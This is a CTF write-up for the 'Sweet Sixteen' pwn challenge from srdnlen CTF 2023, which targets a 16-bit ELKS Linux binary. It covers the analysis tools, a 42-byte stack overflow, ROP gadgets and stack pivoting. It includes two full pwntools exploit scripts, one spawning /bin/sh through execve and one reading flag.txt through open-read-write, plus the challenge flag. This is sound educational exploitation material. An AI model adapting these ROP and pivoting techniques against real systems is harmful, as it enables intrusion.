# Sweet Sixteen

CTF: srdnlen CTF 2023

Category: pwn

Difficulty: Medium-Hard

Author: AstralXploit0 (Davide Maiorca)

# Description

---

> I'd do anything
> 
> 
> For my sweet sixteen
> 
> I'd do anything
> 
> For that runaway child
> 
> (Billy Idol, Sweet Sixteen, 1986)
> 
> This challenge is a small love letter to binary exploitation. Enjoy it!
> 

# Solution

---

As the challenge says, this is my small love letter to binary exploitation. The goal of the challenge is to test your skills against a very rare system (not that 8086-Assembly is rare by itself, but the system it runs on is for sure not well-known). Hence, this write-up has been designed to show you not only how you should have solved the challenge, but also how you should have approached it conceptually (and the ideas behind the challenge).

The challenge is articulated into three parts:

- **Understanding the system** the binary is supposed to run on (there is a rationale behind it, which I will explain in the following);
- **Understanding how to analyze** the binary;
- **Exploiting** the binary;

I will divide the solution into these parts. 

One very important thing: this challenge has been designed with the idea to **reward** those who spend time reading documentation and details. There are multiple “traps” in this challenge that can be easily avoided if you focus on details (and read carefully certain documentation pages).

### Understanding the System and Running the Binary

The first instinct would be to open the binary with IDA. However, even using the **file**command in Linux can be useful, as it provides that the executable was designed for Intel 8086 (hence, 16-bit architecture). Moreover, we get two important pieces of information:

- It is for **Linux**;
- It is marked as **A_EXEC**. This detail is important for those binaries that are correctly compiled for Linux architectures that support 16-bit systems.

Normally, one would expect to see a DOS binary when dealing with 16-bit architectures. How many systems are there that run Linux for 16-bit architectures? A simple search in Google of Linux-8086 executable would lead you to **ELKS**, a Linux distribution designed to run on very old architectures. **The catch here is that this distribution is a modernized version of Linux adapted to old systems (this detail is VERY important when you are required to exploit the binary).**

The link to the GitHub is this one: [https://github.com/ghaerr/elks](https://github.com/ghaerr/elks)

Of course, one does not know for sure if the system is the right one. To have further confirmation, there are two ways:

- Running the system with qemu, copy the file, and write it. The GitHub contains everything necessary, as it suffices to run the **build.sh** file and then the **qemu.sh** to run the system. The file can be tested by following the indications in the documentation: [https://htmlpreview.github.io/?https://raw.githubusercontent.com/jbruchon/elks/master/Documentation/html/user/writing_apps_in_C.html](https://htmlpreview.github.io/?https://raw.githubusercontent.com/jbruchon/elks/master/Documentation/html/user/writing_apps_in_C.html)
- Running **elksemu (see the documentation link before),*** a tool that is compiled after you run the **build.sh** file to emulate in 64bit machines the behavior of the file.

The winning choice is using the second tool (the folder tests in elks-master was created by me), which **will also allow you to interact with the binary through Pwntools (extremely important for later)**. Executing the program with elksemu will give you the input "Pwn Me:".

**Side note (for enthusiasts :-) ):** The build.sh file also creates the toolchain that is necessary to build C files. In particular, it will create a variant of GCC called **ia16-elf-gcc** that creates a 16-bit assembly wrapped in a 32-bit executable. GCC will then call a tool called **elf2elks** (ensure that you have it on your PATH variable before running GCC, otherwise, you will not get a file that works with ELKS - this is very annoying, and I found that out after various tests). There is also another way to compile files that work on ELKS - and it is by using **bcc**, a simple compiler that can be easily found through apt ([https://linux.die.net/man/1/bcc](https://linux.die.net/man/1/bcc)). However, this compiler gave issues with symbols and debugging, so I stuck to ia16-elf-gcc for the challenge.

### Binary Analysis

The trickiest part of the challenge is to understand how to analyze it without falling into some “conceptual traps” :-). 

There are two ways to analyze the binary statically:

- Using **IDA** by setting the processor to **8086** - produces a correct 16-bit disassembly (starting from the 0x20 header - according to the ELKS documentation, the first 0x20 bytes of the binary are for header-based information and contain no code). I tried some tests with Ghidra with no luck (Edit: somebody during the competition managed to use Ghidra by loading the executable in 16 bit real mode, thus also managing to decompile the functions!), but maybe there is a way to see that as well. **However, be careful: as IDA treats the file as a pure binary file, we are not considering relocations here: the binary is rebased. Hence, every address you find in IDA should be subtracted by 0x20.**
- Using the **disassembler provided in the ELKS** Git Hub (in particular, a binary called **hostdisasm** contained in the elkscmd/debug folder). The nice thing about this challenge is that you have EVERYTHING you need to analyze the binary without resorting to external tools. There is only one “little” problem: **the authors of elks did not include the compiling of the debug folder in the Makefile** (at least, according to the current version), so you have to **manually edit the Makefile in the elkscmd folder to include the debug folder** before running the build.sh file. When you try to run the build.sh file, you may get a compilation error on a constant value. To fix it, just modify the target .c file with a value for the variable, and you are good to go. I understand that taking this road can be quite tricky, but it can be a nice journey to learn something new. **The reward is immediately seeing the correct address for the instructions, as they are already rebased to 0x0 by hostdisasm.**

Concerning dynamic analysis, there is <s>only one way to carry out proper dynamic analysis</s> (Edit: somebody during the competition managed to perform some kind of debugging by directly running GDB on elksemu and reaching the process memory from there): using the **blink16** tool that is reported in the ELKS Github: [https://github.com/ghaerr/blink16](https://github.com/ghaerr/blink16). 

Once you manage to extract the disassembly and (maybe) perform dynamic analysis, you will soon realize that:

- I intentionally removed all symbols :-)
- Using blink16 is painful. In my case, I could not even step over (some of my team members could do it, so it is possible, but overall the execution is annoying anyway). However, using blink is useful to see that the binary is rebased starting from the address 0x0.

And here comes the “key” intuition of the challenge: ***this challenge was designed to be solved “blindly”.**  No deep inspection of the disassembly or huge dynamic analyses are required. This demands the player to have some intuition and experience to understand this point. 
Edit: some players solved this challenge by properly decompiling the binary with Ghidra. Hence, even a non-blind solution is definitely possible.

### Exploitation

The program asks the user to provide a data string. Considering the lack of symbols, the first problem is finding where the user input read occurs to understand more of the program structure. While this is not strictly necessary to solve the challenge, it can be greatly helpful.

Let’s try a black-box approach by sending multiple characters: we notice that **we get segmentation fault when more than 42 bytes** are sent. This means that we are overwriting the return address, **and we have a very simple buffer overflow vulnerability**. Since we are in a 16-bit architecture, we have to remember 2 bytes for the BP register (the stack structure is the same as in any other binary). Hence, our buffer is ******************40 bytes long.******************

Hence, how can we find the reading string? There is **************************only one lea************************** instruction in the whole assembly that operates on a 40-byte buffer, and **it is at offset 0x8b**. You can easily find it with grep or with a text editor. If we look at the instructions **after this offset and before the ret, we do not see much except one call**. We can speculate that this call is used to read the buffer (this is indeed just speculation unless you want to destroy yourself by analyzing the code :-) ). **Therefore, the simplest approach is hoping that the call is simply a read and behaving consequently.**

The easiest way to confirm this is by trying to return to “Pwn me”. To do so, you can simply send 40 bytes + 2 + the address of the **push bp instruction that represents the function's prologue containing the target lea instruction** (address **0x25**). There are three ways to calculate this address:

- If you used **********hostdisasm**********, the address can be immediately obtained
- If you used **IDA**, subtract the header size **0x20** to the address you find
- **Bruteforce**! You are in 16-bit architecture (hence you have to bruteforce 2 bytes only with pwntools); ELKS also produces an executable where the user code is on the upper part of the binary, making it easy to immediately find the correct address.

Great, now you can control the return address. However, if you think you can simply run the shellcode because you are in an old architecture, you would be mistaken. In fact, **I used GCC so it could introduce some of the modern protections, so we have NX on the stack** :-). **However, modern exploitation techniques are powerful enough to bypass nx with a ROP chain**. There are two challenges here:

- Finding the proper gadgets.
- The size of the user input is **6 bytes. This means that you have 14 bytes for a ROP chain. However, these bytes are not enough for a “straight” rop chain.**

Let’s see how we can address the first problem. The syscall structure is exactly the same as 32 bit assembly. To spawn a shell we would need the following:

- Setting ax to **0xb**
- Setting bx to the address of a buffer containing **/bin/sh** (note ELKS does not run sh, but the emulation through elkscmd allows us to directly access the host machine shell!)
- Setting cx and dx to **null**

Let’s address the first problem. The first thing is to find an ************int 0x80************ gadget (you cannot use ropper, but you can use **grep -BN ret** on the disassembly- where N is the number of assembly lines), which is found at the address **0xad.**

```bash
0088  b8 03 00          mov     $0x3,%ax
008b  e9 11 00          jmp     009f // 009f
008e  b8 01 00          mov     $0x1,%ax
0091  e9 28 00          jmp     00bc // 00bc
0094  89 e3             mov     %sp,%bx
0096  8b 4f 04          mov     0x04(%bx),%cx
0099  8b 5f 02          mov     0x02(%bx),%bx
009c  e9 0e 00          jmp     00ad // 00ad
009f  89 e3             mov     %sp,%bx
00a1  8b 57 06          mov     0x06(%bx),%dx
00a4  8b 4f 04          mov     0x04(%bx),%cx
00a7  8b 5f 02          mov     0x02(%bx),%bx
00aa  e9 00 00          jmp     00ad // 00ad
00ad  cd 80             int     $0x80
```

 

The very interesting point is how **0xad** is reached. In fact, there is an unconditional jump that is **preceeded by three gadgets that set up dx, cx and bx by using the previous bx value as a memory reference** (note the AT&T convention here, where the register on the right is the destionation). **Even more interesting, the value of bx corresponds to sp (0x9f)!** **Hence, if we manage to control sp, we could easily set up dx, cx, and bx itself!**

However, there is a problem: how do we set ax, which contains the syscall number? **We can solve this by referring the xchg instruction that modifies ax by setting the di value (0x2a9).**

```bash
02a9  97                xchg    %ax,%di
02aa  89 ec             mov     %bp,%sp
02ac  5d                pop     %bp
02ad  5f                pop     %di
02ae  5e                pop     %si
02af  c3                ret
```

The address of **pop di** can be taken directly from the code itself here, and it’s **0x2ac (we also include pop bp here to set up bp accordingly - see later).** 

Since each gadget features multiple pop instructions, **we need more than 14 bytes to allocate our ROP chain.** Hence, we need to resort to **stack pivoting** to use a memory area where we allocate our rop chain (we can use the .data section of the executable). To do so, we can resort to the system call read that is invoked starting from 0x88 (check the system call number and the sequence of instructions from that point:

```python
0088  b8 03 00          mov     $0x3,%ax
008b  e9 11 00          jmp     009f // 009f
008e  b8 01 00          mov     $0x1,%ax
0091  e9 28 00          jmp     00bc // 00bc
0094  89 e3             mov     %sp,%bx
0096  8b 4f 04          mov     0x04(%bx),%cx
0099  8b 5f 02          mov     0x02(%bx),%bx
009c  e9 0e 00          jmp     00ad // 00ad
009f  89 e3             mov     %sp,%bx
00a1  8b 57 06          mov     0x06(%bx),%dx
00a4  8b 4f 04          mov     0x04(%bx),%cx
00a7  8b 5f 02          mov     0x02(%bx),%bx
00aa  e9 00 00          jmp     00ad // 00ad
00ad  cd 80             int     $0x80
```

To sum up, here are the gadgets we need:

- The int 0x80 gadget **with the setup of the registers bx,cx and dx** - we refer to it as **syscall** **(0x9f)**
- One gadget that we call **ax_sp to set up ax (0x2a9)**
- One gadget that we call **pop_bp_di to set up di and bp** **(0x2ac, as it also includes pop bp)**
- The **call to the read system call** itself **(we refer to it as read_sys - 0x88)**

Hence, the exploit will work as follows:

- First chain (**chain1**): A first call to **read syscall** that sets the target buffer to **0x2d00 (**you can try various addresses until you manage to execute the write, a good start of the .data section can be 0x2500). The call will follow the principle of the gadgets that start at **0x9f**. **bx** is the value that is **2 bytes (hence, the next block) after the current value of sp, hence 4 bytes after read_sys** (when read_syscall is invoked, sp moves up by two bytes); **cx is 4 bytes after the current value of sp**, hence 6 bytes after read_sys; **********dx is 6 bytes after the current value of sp,********** hence 8 bytes after read_sys. The block immediately after read_sys contains the address to restart the program **(0x0)** so that we can give another ROP chain to transfer the control to the pivoted area.
- Second chain (**chain2**): after resetting the program, we set a second chain to transfer the program flow to the pivoted area. the idea is to **write the bytes of /bin/sh\x00 in 0x2d00**. Hence, we transfer the control to 0x2d00+8 = 0x2d08. **Then, we call the gadget pop_bp_di, which sets bp to 0x2d08, di to 11 (the future value of ax), and si to a random value (not useful)**. **We chain pop_bp_di to the three values**, and then we call the gadget **ax_sp**, which transfers the control to the third chain. **ax_sp** switches di with ai, takes the value of bp makes sp point to the same address (0x2d08), and pops three values that are not useful for us (it resets bp, di, and si, which are now useless).
- Third chain (chain3): it calls the final syscall gadget by starting **setting up the values from 4 bytes after the syscall gadget** (as in chain1 **0x2d00 → bx, 0→cx, 0→dx**) and finally calls int 0x80 to spawn a shell!

I used some sleeps to better synchronize the remote process between the chains.

And there you go, you have the shell! Cat the flag to obtain:

**srdnlen{m0d3rn_xpl01t4t10n_ag41nst_o1d_8086_syst3ms}** 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./elksemu")
context.binary = exe
context.terminal = ["tmux", "neww", "-n", "shell"]

host, port = "localhost", 1616

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    elif args.SSH:
        return ssh(user, host)
    else:
        return process([exe.path, "./sweet16"] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

ru  = lambda *x, **y: io.recvuntil(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
rc  = lambda *x, **y: io.recv(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)

# -- Exploit goes here --

offset = b"a"*42
io = start()
rc(timeout=1)

### Gadgets ###
ax_sp = 0x2a9 # xchg ax, di; sp, bp; pop bp;pop di; pop si; ret;
pop_bp_di = 0x2ac # pop bp; pop di; pop si; ret
syscall = 0x9f # mov sp, bx; dx = sp[6]; cx = sp[4]; bx = sp[2]; int 0x80
read_sys = 0x88
main = 0x0

### Chain 1 ###
chain1 = p16(read_sys) + p16(main) + p16(0) + p16(0x2d00) + p16(200) # write the final ROP chain on 0x2d00 with a length of 200 bytes
sl(offset+chain1)
sleep(0.2)
### Chain 3 ###
chain3 = p16(1337) + p16(1337) + p16(1337) + p16(syscall) + p16(1337) + p16(0x2d00) + p16(0)+p16(0) # Call excve("/bin/sh")
sl(b"/bin/sh\x00"+chain3)
sleep(0.2)
### Chain 2 ###
chain2 = p16(pop_bp_di) + p16(0x2d08) + p16(11) +p16(1337) + p16(ax_sp)

sl(offset+chain2)
sleep(0.2)
#sleep(1)
sl(b"cat flag.txt")
io.interactive()
```

On a side note: this solution has been proposed by one of my teammates. The original solution has been devised WITHOUT using the xchg gadget and WITHOUT opening a shell, thus using open-read-write chain. This can be done as a useful exercise to improve your skills. I report the code below as a reference for the reader.

### Alternative Solution: Open-Read-Write ROP Chain

This is an alternative solution that employs open-read-write without an xchg gadget. The code is very similar (it’s just much longer as it requires to set each syscall), but the original chain is a bit more complicated for each system call, and there is no need to reset the program :-).

```python
from pwn import *

#### USE launch.json to edit arguments
#### PROCESS INFORMATION ####

try:
    sh.close()
except:
    pass

#context.terminal = 'tmux'

# Insert process data here
context.clear(arch='amd64')
context.log_level = 'info'
context.terminal = ["tmux", "neww", "-n", "shell"]
filename = 'elksemu'

# Remote host information
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1616)

exe = context.binary = ELF(filename)
libc = exe.libc

#### PROCESS START HELPERS ####

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, api=True)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript, api=True)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#### GDB SCRIPTING DATA ####
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#### PROGRAM EXECUTION ####

pop_bp_ret = p16(0x724) #pop bp; ret
read_syscall = p16(0x88) # syscall read (the syscall sets arguents with bp+2, bp+4, bp+6 AND sets ax)
set_dx_cx_bx = p16(0x9f) # like read_syscall but bypasses ax setting
pivoting = p16(0x722) # stack pivoting (mov bp, sp; pop bp; ret)
set_ax_dx = p16(0x6f9) #mov 0x6(bp) ax, mov 0x8(bp), mov bp sp, pop bp, ret
ret = p16(0x725) # return 
triple_pop = p16(0x6c6) #pop bp, pop di, pop si
exit = p16(0x8e)
bp_address = 0x2000 # base address of the data area where to write ropchain and files

io = start(["../tests/final"])
#io.sendline(" ")
payload = flat(
    b"A"*40, #random data
    b"B"*2, #fake bp (not useful)
    pop_bp_ret, 
    p16(bp_address), # This is the address of bp to write stuff
    read_syscall, 
    pivoting, 
    p16(0x0), #bx
    p16(bp_address), #cx
    p16(0x500), #dx
)

print(io.recvuntil("Pwn me:\n"))
#print(io.recvrepeat(timeout=2))
io.send(payload)

rop_chain = flat(
    # READ TO PUT FLAG.TXT
    p16(0x0),
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0xa), # bp value calculated considering the distances between elements
    set_ax_dx, 
    p16(0x0), # dummy
    ret, #ret to manage alignment
    triple_pop, #triple pop to move sp and avoid  
    p16(0x3), #dummy value for space reason
    p16(0x3), #ax value (SETS SYSCALL NUMBER - READ) 
    p16(0x0), #dx value (not required. will be reset later)
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x16), # new pop bp value
    set_dx_cx_bx, 
    triple_pop, #triple pop to go to the next call
    p16(0x0), #bx
    p16(bp_address+0x200), #cx - I write flag.txt here
    p16(0x500), #dx

    # # # OPEN SYSCALL
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x2a), # bp value calculated considering the distances between elements (updated +0x20)
    set_ax_dx, #mov 0x6(bp) ax, mov 0x8(bp), mov bp sp, pop bp, ret
    p16(0x0), # dummy
    ret, #ret to manage alignment
    triple_pop, #triple pop to move sp and avoid  
    p16(0x3), #dummy value for space reason
    p16(0x5), #ax value (SETS SYSCALL NUMBER - OPEN) 
    p16(0x0), #dx value (not required. will be reset later)
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x36), # new pop bp value
    set_dx_cx_bx, #directly exploit syscall parameters set to set up parameters and bypass ax 
    triple_pop, #triple pop to go to the next call
    p16(bp_address+0x200), #bx - opening flag.txt
    p16(0x0), #cx - set to zero
    p16(0x0), #dx - set to zero

    # # # READ FROM FLAG.TXT
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x4a), # bp value calculated considering the distances between elements (updated +0x20)
    set_ax_dx, #mov 0x6(bp) ax, mov 0x8(bp), mov bp sp, pop bp, ret
    p16(0x0), # dummy
    ret, #ret to manage alignment
    triple_pop, #triple pop to move sp and avoid  
    p16(0x3), #dummy value for space reason
    p16(0x3), #ax value (SETS SYSCALL NUMBER - READ) 
    p16(0x0), #dx value (not required. will be reset later)
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x56), # new pop bp value
    set_dx_cx_bx, #directly exploit syscall parameters set to set up parameters and bypass ax 
    triple_pop, #triple pop to go to the next call
    p16(0x5), #bx - opening flag.txt
    p16(bp_address+0x300), #cx - sets destination where to read flag
    p16(0x40), #dx - amount of bytes to write

    # # # WRITE FROM FLAG.TXT

    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x6a), # bp value calculated considering the distances between elements (updated +0x20)
    set_ax_dx, #mov 0x6(bp) ax, mov 0x8(bp), mov bp sp, pop bp, ret
    p16(0x0), # dummy
    ret, #ret to manage alignment
    triple_pop, #triple pop to move sp and avoid  
    p16(0x3), #dummy value for space reason
    p16(0x4), #ax value (SETS SYSCALL NUMBER - WRITE) 
    p16(0x0), #dx value (not required. will be reset later)
    pop_bp_ret, #pop bp, ret
    p16(bp_address+0x76), # new pop bp value
    set_dx_cx_bx, #directly exploit syscall parameters set to set up parameters and bypass ax 
    triple_pop, #triple pop to go to the next call
    p16(0x1), #bx - write to stdout
    p16(bp_address+0x300), #cx - sets destination where to write flag
    p16(0x34), #dx - amount of bytes to write
    exit #exit to avoid segfaults :-)
)   

io.recvrepeat(timeout=0.2)
io.send(rop_chain)
#io.send(rop_chain)
io.recvrepeat(timeout=0.2)
io.send("./flag.txt\x00")

print(io.recvrepeat(timeout=0.2))
io.interactive()
```

---
